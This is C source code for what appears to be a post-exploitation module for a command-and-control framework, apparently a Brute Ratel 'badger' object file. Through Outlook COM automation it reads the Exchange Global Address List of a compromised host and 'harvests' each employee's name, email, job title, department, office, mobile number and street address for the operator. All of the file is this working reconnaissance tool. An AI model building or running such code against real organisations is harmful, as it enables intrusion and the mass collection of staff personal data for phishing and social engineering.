#include "badger_exports.h"

typedef struct _OutlookContactRecord {
	BSTR Name;
	BSTR PrimarySmtpAddress;
	BSTR JobTitle;
	BSTR Department;
	BSTR OfficeLocation;
	BSTR City;
	BSTR MobileTelephoneNumber;
	BSTR StreetAddress;
	BSTR PostalCode;
	BSTR StateOrProvince;
} OutlookContactRecord, *POutlookContactRecord;

typedef enum _OlAddressEntryUserType {
	olExchangeUserAddressEntry = 0,
	olExchangeDistributionListAddressEntry = 1,
	olExchangePublicFolderAddressEntry = 2,
	olExchangeAgentAddressEntry = 3,
	olExchangeOrganizationAddressEntry = 4,
	olExchangeRemoteUserAddressEntry = 5,
	olOutlookContactAddressEntry = 10,
	olOutlookDistributionListAddressEntry = 11,
	olLdapAddressEntry = 20,
	olSmtpAddressEntry = 30,
	olOtherAddressEntry = 40
} OlAddressEntryUserType;

WINADVAPI WINAPI HRESULT Ole32$CoInitializeEx(LPVOID, DWORD);
WINADVAPI WINAPI VOID Ole32$CoUninitialize();
WINADVAPI WINAPI HRESULT Ole32$CLSIDFromProgID(LPCOLESTR, LPCLSID);
WINADVAPI WINAPI HRESULT Ole32$CoCreateInstance(REFCLSID, LPUNKNOWN ,DWORD ,REFIID, LPVOID*);
WINADVAPI WINAPI BSTR Oleaut32$SysAllocString(const OLECHAR *psz);
WINADVAPI WINAPI VOID* Msvcrt$calloc(size_t _NumOfElements, size_t _SizeOfElements);
WINADVAPI WINAPI VOID Msvcrt$free(void *_Memory);
WINADVAPI WINAPI size_t Msvcrt$wcslen(WCHAR*);

HRESULT STDMETHODCALLTYPE GetApplicationDispatchInterface(_Out_ IDispatch**);
HRESULT STDMETHODCALLTYPE GetDispatchInterface(_In_ IDispatch*, _In_ LPOLESTR, _In_opt_ VARIANT*, _In_ DWORD, _Out_ IDispatch**, _Inout_opt_ DISPID*);
HRESULT STDMETHODCALLTYPE GetDispatchInterfaceProperty(_In_ IDispatch*, _In_ LPOLESTR, _In_ DWORD, _Inout_opt_ DISPID*, _Out_ VARIANT*);

void coffee(char** argv, int argc, WCHAR** dispatch) {
	HRESULT hresult = Ole32$CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if (hresult) {
		goto cleanUp;
	}

	OutlookContactRecord* ppContactRecords = NULL;

	IDispatch* pIApplication = NULL;
	hresult = GetApplicationDispatchInterface(&pIApplication);
	if (hresult) {
		goto cleanUp;
	}

	IDispatch* pINamespace = NULL;
	VARIANT Namespace = { 0 };
	Namespace.vt = VT_BSTR;
	Namespace.bstrVal = Oleaut32$SysAllocString(L"MAPI");
	hresult = GetDispatchInterface(pIApplication, L"GetNamespace", &Namespace, 0x01, &pINamespace, (DISPID*)NULL);
	if (hresult) {
		goto cleanUp;
	}

	IDispatch* pIAddressList = NULL;
	hresult = GetDispatchInterface(pINamespace, L"GetGlobalAddressList", (VARIANT*)NULL, 0, &pIAddressList, (DISPID*)NULL);
	if (hresult) {
		goto cleanUp;
	}

	IDispatch* pIAddressEntries = NULL;
	hresult = GetDispatchInterface(pIAddressList, L"AddressEntries", (VARIANT*)NULL, 0, &pIAddressEntries, (DISPID*)NULL);
	if (hresult) {
		goto cleanUp;
	}

	VARIANT vRecords = { 0 };
	hresult = GetDispatchInterfaceProperty(pIAddressEntries, L"Count", VT_I4, NULL, &vRecords);
	if (hresult) {
		goto cleanUp;
	}

	ppContactRecords = Msvcrt$calloc(vRecords.llVal, sizeof(OutlookContactRecord));
	DISPID ItemId = 0;
	DISPID AddressEntryUserTypeId = 0;
	DISPID GetExchangeUserId = 0;
	OutlookContactRecord* lpRecord = ppContactRecords;
	VARIANT ItemIndex = { 0 };
	ItemIndex.vt = VT_I4;
	LONG cx = 0;

	BadgerDispatchW(dispatch, L"[*] Harvesting [%d] Contacts\n==================================================|\n", vRecords.llVal);

	for (; cx < vRecords.llVal; cx++) {
		IDispatch* pAddressEntry = NULL;
		ItemIndex.llVal = cx + 1;

		hresult = GetDispatchInterface(pIAddressEntries, L"Item", &ItemIndex, 0x01, &pAddressEntry, &ItemId);
		if (hresult) {
			goto cleanUp;
		}

		VARIANT EntryType = { 0 };
		hresult = GetDispatchInterfaceProperty(pAddressEntry, L"AddressEntryUserType", VT_I4, &AddressEntryUserTypeId, &EntryType);
		if (hresult) {
			goto cleanUp;
		}

		if ((OlAddressEntryUserType)EntryType.llVal != olExchangeUserAddressEntry) {
			continue;
		}

		IDispatch* pExchangeUser = NULL;
		hresult = GetDispatchInterface(pAddressEntry, L"GetExchangeUser", NULL, 0, &pExchangeUser, &GetExchangeUserId);
		if (hresult) {
			goto cleanUp;
		}


		VARIANT Data = { 0 };
		GetDispatchInterfaceProperty(pExchangeUser, L"Name", VT_BSTR, NULL, &Data);
		lpRecord->Name = Oleaut32$SysAllocString(Data.bstrVal);
		if (lpRecord->Name != NULL && Msvcrt$wcslen(lpRecord->Name) > 0) {
			BadgerDispatchW(dispatch, L"[+] %-16s: %s\n", L"name", lpRecord->Name);
		}

		GetDispatchInterfaceProperty(pExchangeUser, L"PrimarySmtpAddress", VT_BSTR, NULL, &Data);
		lpRecord->PrimarySmtpAddress = Oleaut32$SysAllocString(Data.bstrVal);
		if (lpRecord->PrimarySmtpAddress != NULL && Msvcrt$wcslen(lpRecord->PrimarySmtpAddress) > 0) {
			BadgerDispatchW(dispatch, L"  - %-16s: %s\n", L"email", lpRecord->PrimarySmtpAddress);
		}

		GetDispatchInterfaceProperty(pExchangeUser, L"JobTitle", VT_BSTR, NULL, &Data);
		lpRecord->JobTitle = Oleaut32$SysAllocString(Data.bstrVal);
		if (lpRecord->JobTitle != NULL && Msvcrt$wcslen(lpRecord->JobTitle) > 0) {
			BadgerDispatchW(dispatch, L"  - %-16s: %s\n", L"jobTitle", lpRecord->JobTitle);
		}

		GetDispatchInterfaceProperty(pExchangeUser, L"Department", VT_BSTR, NULL, &Data);
		lpRecord->Department = Oleaut32$SysAllocString(Data.bstrVal);
		if (lpRecord->Department != NULL && Msvcrt$wcslen(lpRecord->Department) > 0) {
			BadgerDispatchW(dispatch, L"  - %-16s: %s\n", L"department", lpRecord->Department);
		}

		GetDispatchInterfaceProperty(pExchangeUser, L"OfficeLocation", VT_BSTR, NULL, &Data);
		lpRecord->OfficeLocation = Oleaut32$SysAllocString(Data.bstrVal);
		if (lpRecord->OfficeLocation != NULL && Msvcrt$wcslen(lpRecord->OfficeLocation) > 0) {
			BadgerDispatchW(dispatch, L"  - %-16s: %s\n", L"officeLocation", lpRecord->OfficeLocation);
		}

		GetDispatchInterfaceProperty(pExchangeUser, L"MobileTelephoneNumber", VT_BSTR, NULL, &Data);
		lpRecord->MobileTelephoneNumber = Oleaut32$SysAllocString(Data.bstrVal);
		if (lpRecord->MobileTelephoneNumber != NULL && Msvcrt$wcslen(lpRecord->MobileTelephoneNumber) > 0) {
			BadgerDispatchW(dispatch, L"  - %-16s: %s\n", L"mobile", lpRecord->MobileTelephoneNumber);
		}

		GetDispatchInterfaceProperty(pExchangeUser, L"City", VT_BSTR, NULL, &Data);
		lpRecord->City = Oleaut32$SysAllocString(Data.bstrVal);

		GetDispatchInterfaceProperty(pExchangeUser, L"StreetAddress", VT_BSTR, NULL, &Data);
		lpRecord->StreetAddress = Oleaut32$SysAllocString(Data.bstrVal);

		GetDispatchInterfaceProperty(pExchangeUser, L"StateOrProvince", VT_BSTR, NULL, &Data);
		lpRecord->StateOrProvince = Oleaut32$SysAllocString(Data.bstrVal);

		GetDispatchInterfaceProperty(pExchangeUser, L"PostalCode", VT_BSTR, NULL, &Data);
		lpRecord->PostalCode = Oleaut32$SysAllocString(Data.bstrVal);
		if (lpRecord->City != NULL && Msvcrt$wcslen(lpRecord->City) > 0) {
			BadgerDispatchW(dispatch, L"  - %-16s: %s\n", L"city", lpRecord->City);
		}
		if (lpRecord->StreetAddress != NULL && Msvcrt$wcslen(lpRecord->StreetAddress) > 0) {
			BadgerDispatchW(dispatch, L"  - %-16s: %s %s %s\n", L"address", lpRecord->StreetAddress, lpRecord->StateOrProvince, lpRecord->PostalCode);
		}

		BadgerDispatchW(dispatch, L"\n");
		lpRecord++;
	}

	Msvcrt$free(ppContactRecords);

cleanUp:
	if (hresult) {
		BadgerDispatchW(dispatch, L"E: %lx\n", hresult);
	}

	Ole32$CoUninitialize();
}

HRESULT STDMETHODCALLTYPE GetApplicationDispatchInterface(_Out_ IDispatch** ppIDispatch) {
    GUID myIID_IDispatch = { 0x00020400, 0x0000, 0x0000, {0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46} };
	if (ppIDispatch == NULL) {
		return E_INVALIDARG;
	}

	CLSID CLSIDOutlookApplication = { 0 };
	if (FAILED(Ole32$CLSIDFromProgID(L"Outlook.Application", &CLSIDOutlookApplication))) {
		return E_FAIL;
	}

	if(FAILED(Ole32$CoCreateInstance(&CLSIDOutlookApplication, NULL, CLSCTX_LOCAL_SERVER, &myIID_IDispatch, (LPVOID*)ppIDispatch))) {
		return E_FAIL;
	}

	if (*ppIDispatch == NULL) {
		return E_FAIL;
	}
	return S_OK;
}

HRESULT STDMETHODCALLTYPE GetDispatchInterface(_In_ IDispatch* pInterface, _In_ LPOLESTR szMethodName, _In_opt_ VARIANT* pVariables, _In_ DWORD dwVaraibles, _Out_ IDispatch** ppIDispatch, _Inout_opt_ DISPID* pDispatchId) {
    GUID myGUID_NULL = { 0x00000000, 0x0000, 0x0000, {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00} };
	if (pInterface == NULL || szMethodName == NULL || ppIDispatch == NULL) {
		return E_INVALIDARG;
	}

	DISPID DispatchId = 0;
	if (pDispatchId != NULL && *pDispatchId != 0) {
		DispatchId = *pDispatchId;
	}
	else {
		if(FAILED(pInterface->lpVtbl->GetIDsOfNames(pInterface, &myGUID_NULL, &szMethodName, 0x01, LOCALE_SYSTEM_DEFAULT, &DispatchId))) {
			return E_FAIL;
		}
		if (pDispatchId != NULL) {
			*pDispatchId = DispatchId;
		}
	}
	
	EXCEPINFO Exception = { 0 };
	VARIANT Result = { 0 };
	DISPPARAMS Parameters = { 0 };

	if (dwVaraibles != 0) {
		Parameters.cArgs = dwVaraibles;
		Parameters.rgvarg = pVariables;
	}

	if(FAILED(pInterface->lpVtbl->Invoke(pInterface, DispatchId, &myGUID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_METHOD, &Parameters, &Result, &Exception, NULL))) {
		return E_FAIL;
	}

	if (Result.vt != VT_DISPATCH) {
		return E_FAIL;
	}
	*ppIDispatch = Result.pdispVal;

	return S_OK;
}

HRESULT STDMETHODCALLTYPE GetDispatchInterfaceProperty(_In_ IDispatch* pInterface, _In_ LPOLESTR szProperty, _In_ DWORD dwPropertyType, _Inout_opt_ DISPID* pDispatchId, _Out_ VARIANT* pProperty) {
    GUID myGUID_NULL = { 0x00000000, 0x0000, 0x0000, {0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00} };
	if (pInterface == NULL || szProperty == NULL || pProperty == NULL) {
		return E_INVALIDARG;
	}

	DISPID DispatchId = 0;
	if (pDispatchId != NULL && *pDispatchId != 0) {
		DispatchId = *pDispatchId;
	} else {
		if(FAILED(pInterface->lpVtbl->GetIDsOfNames(pInterface, &myGUID_NULL, &szProperty, 0x01, LOCALE_SYSTEM_DEFAULT, &DispatchId))) {
			return E_FAIL;
		}
		if (pDispatchId != NULL) {
			*pDispatchId = DispatchId;
		}
	}
	
	EXCEPINFO Exception = { 0 };
	VARIANT Result = { 0 };
	DISPPARAMS Parameters = { 0 };
	Parameters.cArgs = 0;

	if(FAILED(pInterface->lpVtbl->Invoke(pInterface, DispatchId, &myGUID_NULL, LOCALE_SYSTEM_DEFAULT, DISPATCH_PROPERTYGET, &Parameters, &Result, &Exception, NULL))) {
		return E_FAIL;
	}

	if (Result.vt != dwPropertyType) {
		return E_FAIL;
	}
	*pProperty = Result;

	return S_OK;
}